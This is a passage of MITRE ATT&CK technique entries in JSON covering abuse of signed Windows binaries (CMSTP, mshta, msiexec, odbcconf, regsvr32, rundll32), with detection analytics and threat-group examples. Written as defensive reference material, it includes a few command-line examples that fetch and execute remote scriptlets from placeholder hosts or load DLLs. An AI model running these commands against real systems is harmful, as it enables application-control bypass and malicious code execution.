    "Description": "Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.[1]CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.Adversaries may supply CMSTP.exe with INF files infected with malicious commands.[2]Similar toRegsvr32/ \"Squiblydoo\", CMSTP.exe may be abused to load and execute DLLs[3]and/or COM scriptlets (SCT) from remote servers.[4][5][6]This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.CMSTP.exe can also be abused toBypass User Account Controland execute arbitrary commands from a malicious INF through an auto-elevated COM interface.[3][5][6]",
    "Detects": [
      "Monitor executed commands and arguments that may gather information about the victim's hosts that can be used during targeting.Note: Event ID 4104 (from the Microsoft-Windows-Powershell/Operational log) captures Powershell script blocks, which can be analyzed and used to detect on abuse of CMSTP.",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts, such as Sysmon Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The Analytic looks for the creation of a new CMSTP.exe process which initiates a network connection to a non-local IP address. This is a specific implementation where CMSTP.exe can be leveraged to setup listeners that will receive and install malware from remote sources in a trusted fashion.Analytic 1 - CMSTP(sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=\"3\") Image=\"C:\\Windows\\System32\\CMSTP.exe\" | WHERE ((!cidrmatch(\"10.0.0.0/8\", SourceIp) AND !cidrmatch(\"192.168.0.0/16\", SourceIp) AND !cidrmatch(\"172.16.0.0/12\", SourceIp))",
      "Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Sysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include:[6]* To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe* Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F)."
    ],
    "Procedure Examples": [
      "CHIMNEYSWEEPcan use CMSTP.exe to install a malicious Microsoft Connection Manager Profile.[7]",
      "Cobalt Grouphas used the commandcmstp.exe /s /ns C:\\Users\\ADMINI~W\\AppData\\Local\\Temp\\XKNqbpzl.txtto bypass AppLocker and launch a malicious script.[8][9][10]",
      "LockBit 3.0can attempt a CMSTP UAC bypass if it does not have administrative privileges.[11]",
      "MuddyWaterhas used CMSTP.exe and a malicious INF to execute itsPOWERSTATSpayload.[12]"
    ]
  },
  "T1218.004": {
    "Name": "System Binary Proxy Execution:InstallUtil",
    "Description": "Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.[1]The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system:C:\\Windows\\Microsoft.NET\\Framework\\v\\InstallUtil.exeandC:\\Windows\\Microsoft.NET\\Framework64\\v\\InstallUtil.exe.InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute[System.ComponentModel.RunInstaller(true)].[2]",
    "Detects": [
      "Monitor executed commands and arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.",
      "Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity"
    ],
    "Procedure Examples": [
      "Chaeshas used Installutill to download content.[3]",
      "Covenantcan create launchers via an InstallUtil XML file to install new Grunt listeners.[4]",
      "menuPasshas usedInstallUtil.exeto execute malicious software.[5]",
      "Mustang Pandahas usedInstallUtil.exeto execute a malicious Beacon stager.[6]",
      "Saint Bothad usedInstallUtil.exeto download and deploy executables.[7]",
      "WhisperGatehas usedInstallUtil.exeas part of its process to disable Windows Defender.[8]"
    ]
  },
  "T1218.005": {
    "Name": "System Binary Proxy Execution:Mshta",
    "Description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code[1][2][3][4][5]Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.[6]HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.[7]Files may be executed by mshta.exe through an inline script:mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))They may also be executed directly from URLs:mshta http[:]//webserver/payload[.]htaMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.[8]",
    "Detects": [
      "Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.",
      "Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Use process monitoring to monitor the execution and arguments of mshta.exe."
    ],
    "Procedure Examples": [
      "APT29has usemshtato execute malicious scripts on a compromised host.[9]",
      "APT32has used mshta.exe for code execution.[10][11]",
      "APT38has used a renamed version ofmshta.exeto execute malicious HTML files.[12]",
      "BabySharkhas used mshta.exe to download and execute applications from a remote server.[13]",
      "DuringC0015, the threat actors usedmshtato execute DLLs.[14]",
      "Confuciushas used mshta.exe to execute malicious VBScript.[15]",
      "Covenantcan create HTA files to install Grunt listeners.[16]",
      "Earth Luscahas usedmshta.exeto load an HTA script within a malicious .LNK file.[17]",
      "FIN7has used mshta.exe to execute VBScript to execute malicious code on victim systems.[5]",
      "Gamaredon Grouphas usedmshta.exeto execute malicious files.[18][19]",
      "Inceptionhas used malicious HTA files to drop and execute malware.[20]",
      "Kimsukyhas used mshta.exe to run malicious scripts on the system.[21][13][22][23]",
      "Koadiccan use mshta to serve additional payloads and to help schedule tasks for persistence.[24][25]",
      "Lazarus Grouphas usedmshta.exeto execute HTML pages downloaded by initial access documents.[26][27]",
      "LazyScripterhas usedmshta.exeto executeKoadicstagers.[25]",
      "Lumma Stealerhas used mshta.exe to execute additional content.[28][29]",
      "Metamorfohas used mshta.exe to execute a HTA payload.[30]",
      "MuddyWaterhas used mshta.exe to execute itsPOWERSTATSpayload and to pass a PowerShell one-liner for execution.[31][32]",
      "Mustang Pandahas used mshta.exe to launch collection scripts.[33]",
      "NanHaiShuuses mshta.exe to load its program and files.[34]",
      "DuringOperation Dust Storm, the threat actors executed JavaScript code viamshta.exe.[1]",
      "POWERSTATScan use Mshta.exe to execute additional payloads on compromised hosts.[31]",
      "Pteranodoncan use mshta.exe to execute an HTA file hosted on a remote server.[18]",
      "Revenge RATuses mshta.exe to run malicious scripts on the system.[35]",
      "Sibothas been executed via MSHTA application.[36]",
      "SideCopyhas utilizedmshta.exeto execute a malicious hta file.[37]",
      "Sidewinderhas usedmshta.exeto execute malicious payloads.[38][39]",
      "TA2541has usedmshtato execute scripts including VBS.[40]",
      "TA551has used mshta.exe to execute malicious payloads.[41]",
      "Xbashcan use mshta for executing scripts.[42]"
    ]
  },
  "T1218.007": {
    "Name": "System Binary Proxy Execution:Msiexec",
    "Description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).[1]The Msiexec.exe binary may also be digitally signed by Microsoft.Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.[2][3]Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if theAlwaysInstallElevatedpolicy is enabled.[4]",
    "Detects": [
      "Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.",
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files."
    ],
    "Procedure Examples": [
      "AppleJeushas been installed via MSI installer.[5]",
      "APT38has usedmsiexec.exeto execute malicious files.[6]",
      "Chaeshas used .MSI files as an initial way to start the infection chain.[7]",
      "Clopcan use msiexec.exe to disable security tools on the system.[8]",
      "DEADEYEcan usemsiexec.exefor execution of malicious DLL.[9]",
      "Duquhas usedmsiexecto execute malicious Windows Installer packages. Additionally, a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages.[10]",
      "FlawedAmmyyhas been installed viamsiexec.exe.[11]",
      "Grandoreirocan use MSI files to execute DLLs.[12]",
      "IcedIDcan inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application.[13]IcedIDhas also used msiexec.exe to deploy theIcedIDloader.[14]",
      "Javalihas used the MSI installer to download and execute malicious payloads.[12]",
      "Latrodectushas calledmsiexecto install remotely-hosted MSI files.[15][16]",
      "LoudMinerused an MSI installer to install the virtualization software.[17]",
      "Machetehas used msiexec to install theMachetemalware.[18]",
      "Mazehas delivered components for its ransomware attacks using MSI files, some of which have been executed from the command-line usingmsiexec.[19]",
      "Melcozcan use MSI files with embedded VBScript for execution.[12]",
      "Metamorfohas used MsiExec.exe to automatically execute files.[20][21]",
      "Mispaduhas been installed via MSI installer.[22][23]",
      "Moleratshas used msiexec.exe to execute an MSI payload.[24]",
      "QakBotcan use MSIExec to spawn multiple cmd.exe processes.[25]",
      "Ragnar Lockerhas been delivered as an unsigned MSI package that was executed withmsiexec.exe.[26]",
      "Rancorhas usedmsiexecto download and execute malicious installer files over HTTP.[27]",
      "Raspberry Robinuses msiexec.exe for post-installation communication to command and control infrastructure.[28]Msiexec.exe is executed referencing a remote resource for second-stage payload retrieval and execution.[29]",
      "RCSessionhas the ability to execute inside the msiexec.exe process.[30]",
      "Mustang Pandainitial payloads downloaded a Windows Installer MSI file that in turn dropped follow-on files leading to installation ofPlugXduringRedDelta Modified PlugX Infection Chain Operations.[31]",
      "RemoteUtilitiescan use Msiexec to install a service.[32]",
      "TA505has usedmsiexecto download and execute malicious Windows Installer files.[33][34][35]",
      "ZIRCONIUMhas used the msiexec.exe command-line utility to download and execute malicious MSI files.[36]"
    ]
  },
  "T1218.008": {
    "Name": "System Binary Proxy Execution:Odbcconf",
    "Description": "Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.[1]The Odbcconf.exe binary may be digitally signed by Microsoft.Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar toRegsvr32, odbcconf.exe has aREGSVRflag that can be misused to execute DLLs (ex:odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\file.dll\"}).[2][3][4]",
    "Detects": [
      "Command arguments used before and after the invocation of odbcconf.exe may also be useful in determining the origin and purpose of the DLL being loaded.",
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.",
      "Use process monitoring to monitor the execution and arguments of odbcconf.exe. Compare recent invocations of odbcconf.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity."
    ],
    "Procedure Examples": [
      "Bumblebeecan useodbcconf.exeto run DLLs on targeted hosts.[5]",
      "Cobalt Grouphas usedodbcconfto proxy the execution of malicious DLL files.[4]",
      "Raspberry Robinuses the Windows utility odbcconf.exe to execute malicious commands, using theregsvrflag to execute DLLs and bypass application control mechanisms that are not monitoring for odbcconf.exe abuse.[6]"
    ]
  },
  "T1218.009": {
    "Name": "System Binary Proxy Execution:Regsvcs/Regasm",
    "Description": "Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NETComponent Object Model(COM) assemblies. Both are binaries that may be digitally signed by Microsoft.[1][2]Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration:[ComRegisterFunction]or[ComUnregisterFunction]respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.[3][4]",
    "Detects": [
      "Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.",
      "Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity."
    ],
    "Procedure Examples": [
      "Agent Teslahas dropped RegAsm.exe onto systems for performing malicious activity.[5]"
    ]
  },
  "T1218.010": {
    "Name": "System Binary Proxy Execution:Regsvr32",
    "Description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft.[1]Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.[2]This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments.[3][4]Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence viaComponent Object Model Hijacking.[3]",
    "Detects": [
      "Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded.[3]",
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.Note: This looks for unsigned images that may be loaded by regsvr32, while attempting to eliminate false positives stemming from Windows/Program Files binaries.Analytic 5 - Loading Unsigned Images(sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=\"7\") (Image=\"C:\\Windows\\System32\\regsvr32.exe\" OR Image=\"C:\\Windows\\SysWOW64\\regsvr32.exe\") Signed=false ImageLoaded!=\"C:\\Program Files\" ImageLoaded!=\"C:\\Windows\\\"|stats values(ComputerName) as \"Computer Name\" count(ImageLoaded) as ImageLoadedCount by ImageLoaded",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). - Analytic 1 is a more generic analytic that looks for suspicious usage of regsvr32.exe, specifically for cases where regsvr32.exe creates child processes that aren’t itself. It’s not likely that this will result in millions of hits, but it does occur during benign activity so some form of baselining would be necessary for this to be useful as an alerting analytic.- Analytic 2 is around \"Squiblydoo\", which is a specific usage of regsvr32.exe to load a COM scriptlet directly from the internet and execute it in a way that bypasses application whitelisting. It looks for regsvr32.exe process creation events that load scrobj.dll via the command-line (which executes the COM scriptlet).- Analytic 3 This uses the same logic as above, but adds lightweight baselining by ignoring all results that also showed up in the previous 30 days (it runs over 1 day).- Analytic 4 This looks for child processes that may be spawend by regsvr32, while attempting to eliminate some of the common false positives such as werfault (Windows Error Reporting).Analytic 1 - Generic Regsvr32(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") regsvr32.exe | search ParentImage=\"regsvr32.exe\" AND Image!=\"regsvr32.exe*\"Analytic 2 - Squiblydoo(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") regsvr32.exe scrobj.dll | search Image=\"*regsvr32.exe\"Analyt 3 - New Items since last month(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") earliest=-d@d latest=now() regsvr32.exe | search ParentImage=\"regsvr32.exe\" AND Image!=\"regsvr32.exe\" | search NOT [search (source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") earliest=-60d@d latest=-30d@d regsvr32.exe | search ParentImage=\"regsvr32.exe\" AND Image!=\"regsvr32.exe\" | dedup CommandLine | fields CommandLine ]Analytic 4 - Spawning Child Processes(source=\"*WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") (ParentImage=\"C:\\Windows\\System32\\regsvr32.exe\" OR ParentImage=\"C:\\Windows\\SysWOW64\\regsvr32.exe\") AND Image!=\"C:\\Windows\\System32\\regsvr32.exe\" AND Image!=\"C:\\Windows\\SysWOW64\\regsvr32.exe\" AND Image!=\"C:\\WINDOWS\\System32\\regsvr32.exe\" AND Image!=\"C:\\WINDOWS\\SysWOW64\\regsvr32.exe\" AND Image!=\"C:\\Windows\\SysWOW64\\WerFault.exe\" AND Image!=\"C:\\Windows\\System32\\wevtutil.exe\" AND Image!=\"C:\\Windows\\System32\\WerFault.exe\"|stats values(ComputerName) as \"Computer Name\" values(ParentCommandLine) as \"Parent Command Line\" count(Image) as ImageCount by Image"
    ],
    "Procedure Examples": [
      "AppleSeedcan call regsvr32.exe for execution.[5]",
      "APT19used Regsvr32 to bypass application control techniques.[6]",
      "APT32created aScheduled Task/Jobthat used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor.[7][8][9]",
      "Astarothcan be loaded through regsvr32.exe.[10]",
      "Blue Mockingbirdhas executed custom-compiled XMRIG miner DLLs using regsvr32.exe.[11]",
      "DuringC0015, the threat actors employed code that usedregsvr32for execution.[12]",
      "Cobalt Grouphas used regsvr32.exe to execute scripts.[13][14][15]",
      "Covenantcan create SCT files for installation viaRegsvr32to deploy new Grunt listeners.[16]",
      "Deep Pandahas used regsvr32.exe to execute a server variant ofDerusbiin victim networks.[17]",
      "Derusbivariants have been seen that use Registry persistence to proxy execution through regsvr32.exe.[18]",
      "Dridexcan useregsvr32.exeto initiate malicious code.[19]",
      "Egregorhas used regsvr32.exe to execute malicious DLLs.[20]",
      "Emotetuses RegSvr32 to execute the DLL payload.[21]",
      "EVILNUMcan run a remote scriptlet that drops a file and executes it via regsvr32.exe.[22]",
      "HermeticWizardhas usedregsvr32.exe /s /ito execute malicious payloads.[23]",
      "Hi-Zorexecutes using regsvr32.exe called from theRegistry Run Keys / Startup Folderpersistence mechanism.[24]",
      "Inceptionhas ensured persistence at system boot by setting the valueregsvr32 %path%\\ctfmonrn.dll /s.[25]",
      "Kimsukyhas executed malware withregsvr32s.[26]",
      "Koadiccan use Regsvr32 to execute additional payloads.[27]",
      "Leviathanhas used regsvr32 for execution.[28]",
      "More_eggshas used regsvr32.exe to execute the malicious DLL.[29]",
      "Morican useregsvr32.exefor DLL execution.[30]",
      "DuringOperation Dream Job,Lazarus Groupusedregsvr32to execute malware.[31]",
      "SomeOrzversions have an embedded DLL known as MockDll that usesProcess Hollowingand regsvr32 to execute another payload.[28]",
      "QakBotcan use Regsvr32 to execute malicious DLLs.[32][33][34][35][36][37]",
      "Ragnar Lockerhas used regsvr32.exe to execute components of VirtualBox.[38]",
      "Raspberry Robinuses regsvr32.exe execution without any command line parameters for command and control requests to IP addresses associated withTornodes.[39]",
      "RogueRobinuses regsvr32.exe to run a .sct file for execution.[40]",
      "Saint Bothas usedregsvr32to execute scripts.[41][42]",
      "Squirrelwafflehas been executed usingregsvr32.exe.[43]",
      "TA551has used regsvr32.exe to load malicious DLLs.[44]",
      "Valakhas usedregsvr32.exeto launch malicious DLLs.[45][44]",
      "WIRTEhas usedregsvr32.exeto trigger the execution of a malicious script.[46]",
      "Xbashcan use regsvr32 for executing scripts.[47]"
    ]
  },
  "T1218.011": {
    "Name": "System Binary Proxy Execution:Rundll32",
    "Description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:rundll32.exe {DLLname, DLLfunction}).Rundll32.exe can also be used to executeControl PanelItem files (.cpl) through the undocumented shell32.dll functionsControl_RunDLLandControl_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute.[1]For example,ClickOncecan be proxied through Rundll32.exe.Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"This behavior has been seen used by malware such as Poweliks.[2]Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the commandrundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to executeExampleFunctionW, or failing thatExampleFunctionA, before loadingExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appendingWand/orAto harmless ones.[3][4]DLL functions can also be exported and executed by an ordinal number (ex:rundll32.exe file.dll,#1).Additionally, adversaries may useMasqueradingtechniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.[5]",
    "Detects": [
      "Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Typical command-line usage of rundll32.exe is\"rundll32.exe DllFile,EntryPoint\"whereDllFileis the name of the DLL file being called and EntryPoint the name of the entry point in the DLL file.DLLs stored on SMB shares can similarly be called using the syntax of\"rundll32.exe \\\\DllFile,EntryPoint\"whereis the IPv4 address of the host of the SMB share.Rundll32 can also be used to execute arbitrary Javascript using the syntax\"rundll32.exe javascript:<code_block>\"where <code_block> is a string defining the Javascript code to be executed.",
      "Analyze contextual data about executed DLL files, which may include information such as name, the content (ex: signature, headers, or data/media), age, user/owner, permissions, etc.",
      "Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls. Static Portable Executable (PE) analysis tools can be used to examine and dump the exports of a particular DLL.",
      "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.When monitoring for all instances of Rundll32 execution, as defined by the logic in the Detection Pseudocode, it is imperative to also investigate the full set of command-line parameters used. These parameters contain key information about the DLL payload, including the name, entry point, and optional arguments.Note: Event IDs are for Sysmon (Event ID 10 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The Analytic looks for any instances of rundll32.exe but does no other filtering, which may result in false positives. Therefore, we recommend tuning any such analytics by including additional logic (e.g., testing the name of the user that created the process) that helps reduce false positives.Analytic 1 - RunDLL32.exe Monitoring(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image= \"rundll32.exe\""
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm Teamused a backdoor which could execute a supplied DLL usingrundll32.exe.[6]",
      "ADVSTORESHELLhas used rundll32.exe in a Registry value to establish persistence.[7]",
      "APT19configured its payload to inject into the rundll32.exe.[8]",
      "APT28executedCHOPSTICKby using rundll32 commands such asrundll32.exe \"C:\\Windows\\twain_64.dll\".APT28also executed a .dll for a first stage dropper using rundll32.exe. AnAPT28loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.[9][7][10][11][12][13]",
      "APT3has a tool that can run DLLs.[14]",
      "APT32malware has used rundll32.exe to execute an initial infection process.[15]",
      "APT38has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.[16][17]",
      "APT41has used rundll32.exe to execute a loader.[18]",
      "Aquatic Pandaused rundll32.exe to proxy execution of a malicious DLL file identified as a keylogging binary.[19]",
      "Attor's installer plugin can schedule rundll32.exe to load the dispatcher.[20]",
      "Backdoor.Oldreacan use rundll32 for execution on compromised hosts.[21]",
      "Bad Rabbithas used rundll32 to launch a malicious DLL asC:Windowsinfpub.dat.[22]",
      "Bisonalhas used rundll32.exe to execute as part of the Registry Run key it adds:HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"vert\" = \"rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez\".[23]",
      "BLINDINGCANhas used Rundll32 to load a malicious DLL.[24]",
      "Blue Mockingbirdhas executed custom-compiled XMRIG miner DLLs using rundll32.exe.[25]",
      "BoomBoxcan use RunDLL32 for execution.[26]",
      "Bribauses rundll32 withinRegistry Run Keys / Startup Folderentries to execute malicious DLLs.[27]",
      "Bumblebeehas usedrundll32for execution of the loader component.[28][29]",
      "DuringC0015, the threat actors loaded DLLs viarundll32using thesvchostprocess.[30]",
      "DuringC0018, the threat actors usedrundll32to runMimikatz.[31]",
      "DuringC0021, the threat actors usedrundll32.exeto execute theCobalt StrikeBeacon loader DLL.[32]",
      "Carbanakinstalls VNC server software that executes through rundll32.[33]",
      "Cobalt Strikecan userundll32.exeto load DLL from the command line.[34][30][35]",
      "Comnieuses Rundll32 to load a malicious DLL.[36]",
      "CopyKittensuses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.[37]",
      "CORESHELLis installed via execution of rundll32 with an export named \"init\" or \"InitW.\"[38]",
      "TheCozyCardropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the mainCozyCarcomponent.[39]",
      "Daggerflyproxied execution of malicious DLLs through a renamed rundll32.exe binary.[40]",
      "DDKONGuses Rundll32 to ensure only a single instance of itself is running at once.[41]",
      "DEADEYEcan userundll32.exefor execution of living off the land binaries (lolbin) such asSHELL32.DLL.[42]",
      "Egregorhas used rundll32 during execution.[43]",
      "After copying itself to a DLL file, a variant ofElisecalls the DLL file using rundll32.exe.[44]",
      "Variants ofEmissaryhave used rundll32.exe in Registry values added to establish persistence.[45]",
      "EnvyScouthas the ability to proxy execution of malicious files with Rundll32.[26]",
      "EVILNUMcan execute commands and scripts through rundll32.[46]",
      "FatDukecan execute via rundll32.[47]",
      "FELIXROOTuses Rundll32 for executing the dropper program.[48][49]",
      "FIN7has usedrundll32.exeto execute malware on a compromised network.[50]",
      "Rundll32.exe is used as a way of executingFlameat the command-line.[51]",
      "FlawedAmmyyhas usedrundll32for execution.[52]",
      "FunnyDreamcan userundll32for execution of its components.[53]",
      "Gamaredon Groupmalware has used rundll32 to launch additional malicious components.[54]",
      "Agh0st RATvariant has used rundll32 for execution.[55]",
      "GreyEnergyuses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\\SYSTEM).[49]",
      "HAFNIUMhas usedrundll32to load malicious DLLs.[56]",
      "HermeticWizardhas the ability to create a new process usingrundll32.[57]",
      "Heyoka Backdoorcan use rundll32.exe to gain execution.[58]",
      "IcedIDhas used rundll32.exe to execute theIcedIDloader.[59][60]",
      "InvisiMolehas used rundll32.exe for execution.[61]",
      "JHUHUGITis executed using rundll32.exe.[62][63]",
      "Kapekais a Windows DLL file executed via ordinal byrundll32.exe.[64][65]",
      "Kimsukyhas usedrundll32.exeto execute malicious scripts and malware on a victim's network.[66]",
      "Koadiccan use Rundll32 to execute additional payloads.[67]",
      "KONNIhas used Rundll32 to execute its loader for privilege escalation purposes.[68][69]",
      "Kwampirsuses rundll32.exe in a Registry value added to establish persistence.[70]",
      "Latrodectuscan use rundll32.exe to execute downloaded DLLs.[71][72]",
      "Lazarus Grouphas used rundll32 to execute malicious payloads on a compromised host.[73]",
      "LazyScripterhas usedrundll32.exeto executeKoadicstagers.[74]",
      "Magic Houndhas used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.[75]",
      "Matryoshkauses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.[76]",
      "MegaCortexhas usedrundll32.exeto load a DLL for file encryption.[77]",
      "Mispaduuses RunDLL32 for execution via its injector DLL.[78]",
      "Mongallcan userundll32.exefor execution.[58]",
      "Mosquito's launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.[79]",
      "MuddyWaterhas used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.[80]",
      "NativeZonehas used rundll32 to execute a malicious DLL.[81]",
      "Ninjaloader components can be executed through rundll32.exe.[82]",
      "NOKKIhas used rundll32 for execution.[83]",
      "NotPetyausesrundll32.exeto install itself on remote systems when accessed viaPsExecorwmic.[84]",
      "DuringOperation Dream Job,Lazarus Groupexecuted malware withC:\\\\windows\\system32\\rundll32.exe \"C:\\ProgramData\\ThumbNail\\thumbnail.db\",CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905.[85][86][87]",
      "DuringOperation Spalax, the threat actors usedrundll32.exeto execute malicious installers.[88]",
      "PcSharehas usedrundll32.exefor execution.[53]",
      "PolyglotDukecan be executed using rundll32.exe.[47]",
      "PowerDukeuses rundll32.exe to load.[89]",
      "Prikormkauses rundll32.exe to load its DLL.[90]",
      "Pteranodonexecutes functions using rundll32.exe.[91]",
      "PUNCHBUGGYcan load a DLL using Rundll32.[92]",
      "QakBothas used Rundll32.exe to drop malicious DLLs includingBrute Ratel C4and to enable C2 communication.[93][94][95][96][35]",
